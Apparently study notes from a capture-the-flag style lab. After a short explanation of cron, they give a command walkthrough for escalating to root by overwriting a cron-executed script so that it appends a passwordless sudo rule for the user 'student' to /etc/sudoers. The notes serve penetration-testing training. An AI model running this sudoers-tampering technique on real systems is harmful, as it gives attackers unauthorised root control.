# Cron Jobs Gone Wild II

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2986–3037. Examples are lab-specific and need verification.

A **cron job** is a **scheduled task** in Linux/Unix systems.

It uses the **cron daemon** to run commands or scripts automatically at specific times or intervals.

**Cron** = the background service (scheduler).

**Crontab** = the file where jobs are defined.

**Cron job** = one entry/command in the crontab.

Cron is a lifesaver for admins when it comes to doing periodic maintenance tasks on the system. They can even be used in cases where tasks are performed within individual user directories. However, such automations need to be used with caution or can lead to easy privilege escalation attacks.

In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at target.ine.local:8000, which you can access over the browser in Kali.

**Objective:** Your mission is to get a root shell on the box and retrieve the flag!

Tools: **nmap, browser(firefox)**

**Port 8000 = service endpoint.**

**Cron job = scheduler that could manage or interact with that service.**
So, if a service on **port 8000** always restarts at a specific interval (say every 5 minutes), or logs show entries from `cron`, you can be pretty sure it’s triggered by a cron job.

```bash

http://target.ine.local:8000
ls -l
find / -name message
ls -l /tmp/
//Observe that a file with the same name is present in the /tmp directory. On checking closely, it is clear that this file is being overwritten every minute.

grep -nri "/tmp/message" /usr
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh

printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
//no editor, Use printf to replace the original code with the following lines.
cat /usr/local/share/copy.sh
sudo -l
//Note: You might have to wait for 1 minute (i.e. the cron job runs every 1 minute) and check the sudoers list again. This time new entry is there.
sudo su
cd /root
ls -l
cat flag

```
